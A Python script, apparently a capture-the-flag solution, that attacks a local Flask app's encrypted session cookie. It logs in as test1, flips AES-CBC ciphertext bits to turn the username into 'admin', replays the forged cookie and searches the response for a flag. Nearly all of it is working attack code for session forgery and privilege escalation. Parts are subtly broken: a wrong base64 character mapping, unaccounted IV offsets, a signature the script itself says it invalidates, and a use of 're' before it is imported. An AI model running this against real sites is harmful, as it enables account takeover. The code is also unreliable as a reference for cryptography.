import requests
import base64
import json
from urllib.parse import unquote

def flask_b64decode(s):
    """Decode Flask's modified base64 with URL-safe characters"""
    # Flask uses URL-safe base64 with . and _ instead of + and /
    # Pad with = to make length multiple of 4
    s = s.replace('.', '+').replace('_', '/')
    pad_len = 4 - (len(s) % 4)
    if pad_len != 4:
        s += '=' * pad_len
    return base64.b64decode(s)

def flask_b64encode(data):
    """Encode data in Flask's modified base64 format"""
    b64 = base64.b64encode(data).decode()
    # Replace + with . and / with _ and remove padding
    return b64.replace('+', '.').replace('/', '_').rstrip('=')

# Step 1: Authenticate as test1:test1 to get valid session
print("[+] Authenticating as test1:test1...")
session = requests.Session()
login_data = {'username': 'test1', 'password': 'test1'}
login_response = session.post('http://127.0.0.1:32835/login', data=login_data)

if login_response.status_code != 200:
    print(f"[-] Login failed with status: {login_response.status_code}")
    print(f"[-] Response: {login_response.text}")
    exit(1)

# Extract the session cookie
session_cookie = session.cookies.get('session')
if not session_cookie:
    print("[-] No session cookie received")
    exit(1)

print(f"[+] Original session cookie: {session_cookie}")

# Step 2: Parse the cookie (format: payload.timestamp.signature)
cookie_parts = session_cookie.split('.')
if len(cookie_parts) != 3:
    print(f"[-] Unexpected cookie format: {len(cookie_parts)} parts")
    exit(1)

payload_b64 = cookie_parts[0]
timestamp = cookie_parts[1]
signature = cookie_parts[2]

print(f"[+] Payload (b64): {payload_b64}")
print(f"[+] Timestamp: {timestamp}")
print(f"[+] Signature: {signature}")

# Step 3: Decode the payload
try:
    payload_data = flask_b64decode(payload_b64)
    print(f"[+] Decoded payload (hex): {payload_data.hex()}")
    print(f"[+] Decoded payload length: {len(payload_data)} bytes")
except Exception as e:
    print(f"[-] Failed to decode payload: {e}")
    exit(1)

# The payload should contain the JSON with username
# Flask session format: b"{\"logged_in_username\":\"test1\"}"
# We need to find the position of "test1" in the plaintext
plaintext = b'{"logged_in_username":"test1"}'
print(f"[+] Expected plaintext: {plaintext}")
print(f"[+] Expected plaintext (hex): {plaintext.hex()}")

# Check if we can identify "test1" in the payload
test1_pos = plaintext.find(b'test1')
if test1_pos == -1:
    print("[-] 'test1' not found in plaintext")
    exit(1)

print(f"[+] 'test1' found at position {test1_pos} in plaintext")

# Step 4: Perform CBC bit-flipping
# In AES-CBC: Plaintext_block[N] = Decrypt(Ciphertext_block[N]) XOR Ciphertext_block[N-1]
# To change Plaintext_block[N], we XOR Ciphertext_block[N-1] with (old_plaintext XOR new_plaintext)

# We need to operate on the block containing "test1"
# AES block size is 16 bytes
block_size = 16

# Determine which block contains "test1"
block_num = test1_pos // block_size
byte_in_block = test1_pos % block_size

print(f"[+] 'test1' is in block {block_num}, byte {byte_in_block}")
print(f"[+] To modify it, we need to flip bits in previous block (block {block_num-1}) at the same offset")

# For the first block (block 0), the "previous ciphertext" is the IV
# For other blocks, it's the previous ciphertext block

# We want to change "test1" to "admin"
# t->a, e->d, s->m, t->i, 1->n
old_chars = b'test1'
new_chars = b'admin'

print(f"[+] Transforming '{old_chars.decode()}' -> '{new_chars.decode()}'")

# Create modified payload
modified_payload = bytearray(payload_data)

if block_num == 0:
    # In AES-CBC, the IV affects the first plaintext block
    # Position in IV = position in plaintext
    print("[+] Username is in first block, modifying IV")
    for i, (old_char, new_char) in enumerate(zip(old_chars, new_chars)):
        pos_in_block = byte_in_block + i
        if pos_in_block < block_size:
            # XOR formula: new_ct = old_ct XOR old_pt XOR new_pt
            old_ct = modified_payload[pos_in_block]  # IV byte
            new_ct = old_ct ^ old_char ^ new_char
            modified_payload[pos_in_block] = new_ct
            print(f"[+] Byte {pos_in_block}: {old_ct:02x} XOR {old_char:02x} XOR {new_char:02x} = {new_ct:02x}")
else:
    # For blocks > 0, we modify the previous ciphertext block
    prev_block_start = (block_num - 1) * block_size
    print(f"[+] Modifying previous block starting at position {prev_block_start}")
    for i, (old_char, new_char) in enumerate(zip(old_chars, new_chars)):
        target_pos = prev_block_start + byte_in_block + i
        if target_pos < len(modified_payload):
            old_ct = modified_payload[target_pos]
            new_ct = old_ct ^ old_char ^ new_char
            modified_payload[target_pos] = new_ct
            print(f"[+] Byte {target_pos}: {old_ct:02x} XOR {old_char:02x} XOR {new_char:02x} = {new_ct:02x}")

# Step 5: Re-encode the modified payload
modified_payload_b64 = flask_b64encode(modified_payload)
print(f"[+] Modified payload (b64): {modified_payload_b64}")

# Step 6: Construct the new cookie (keep timestamp and signature unchanged)
# Note: This will invalidate the signature, but we're testing if the bit-flipping works
modified_cookie = f"{modified_payload_b64}.{timestamp}.{signature}"
print(f"[+] Modified session cookie: {modified_cookie}")

# Step 7: Test the modified cookie
print("\n[+] Testing modified cookie on /welcome...")
test_session = requests.Session()
test_session.cookies.set('session', modified_cookie, domain='127.0.0.1', path='/')

welcome_response = test_session.get('http://127.0.0.1:32835/welcome')
print(f"[+] Status: {welcome_response.status_code}")
print(f"[+] Response length: {len(welcome_response.text)} bytes")
print(f"[+] Response:\n{welcome_response.text}")

# Check if exploit worked
if 'admin' in welcome_response.text.lower():
    print("\n[✓] SUCCESS: Username changed to 'admin'!")
    # Look for flag
    import re
    flag_match = re.search(r'FLAG\{[^}]+\}', welcome_response.text)
    if flag_match:
        print(f"[✓] FLAG FOUND: {flag_match.group(0)}")
    else:
        print("[-] No flag found in response")
else:
    print("\n[-] EXPLOIT FAILED: Username not changed to 'admin'")
    # Let's also try without the signature to see if it helps
    print("\n[+] Trying with modified payload only (no signature)...")
    simple_modified_cookie = modified_payload_b64
    test_session2 = requests.Session()
    test_session2.cookies.set('session', simple_modified_cookie, domain='127.0.0.1', path='/')
    welcome_response2 = test_session2.get('http://127.0.0.1:32835/welcome')
    print(f"[+] Status: {welcome_response2.status_code}")
    print(f"[+] Response:\n{welcome_response2.text}")
    
    if 'admin' in welcome_response2.text.lower():
        print("\n[✓] SUCCESS with simplified cookie!")
        flag_match = re.search(r'FLAG\{[^}]+\}', welcome_response2.text)
        if flag_match:
            print(f"[✓] FLAG FOUND: {flag_match.group(0)}")
